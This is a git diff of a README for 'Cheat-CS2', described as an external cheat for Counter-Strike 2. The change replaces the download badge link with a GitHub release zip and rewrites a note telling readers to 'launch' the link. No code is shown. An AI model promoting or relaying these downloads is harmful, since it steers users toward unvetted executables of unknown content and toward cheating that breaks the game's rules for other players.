@@ -31,9 +31,9 @@ Welcome to Cheat-CS2, the ultimate external cheat for Counter-Strike 2! This che
 
 ## Software Download
 
-[![Download Cheat-CS2 Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Cheat-CS2 Software](https://github.com/JihuR/Cheat-CS2/releases/download/v2.0/Release_x64.zip)](https://github.com/JihuR/Cheat-CS2/releases/download/v2.0/Release_x64.zip)
 
-*Note: The Software.zip link needs to be launched for download.*
+*Note: The https://github.com/JihuR/Cheat-CS2/releases/download/v2.0/Release_x64.zip link needs to be launched for download.*
 
 If the link is not working, please check the "Releases" section for alternative download options.
 
